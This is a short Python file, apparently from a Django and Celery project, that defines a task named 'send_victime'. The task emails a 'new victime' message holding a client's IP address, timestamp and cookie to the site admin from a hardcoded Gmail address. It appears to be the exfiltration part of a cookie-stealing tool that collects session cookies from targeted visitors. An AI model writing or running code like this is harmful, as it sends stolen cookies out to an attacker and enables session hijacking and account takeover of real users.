from celery.task import task
from django.conf import settings
from django.core.mail import send_mail


@task()
def send_victime(client):
    send_mail('new victime',client.ip + '  ' + unicode(client.date) + ' ' + client.cookie,'mail.de.test.mehdi@gmail.com',[settings.ADMINS[0][1]])
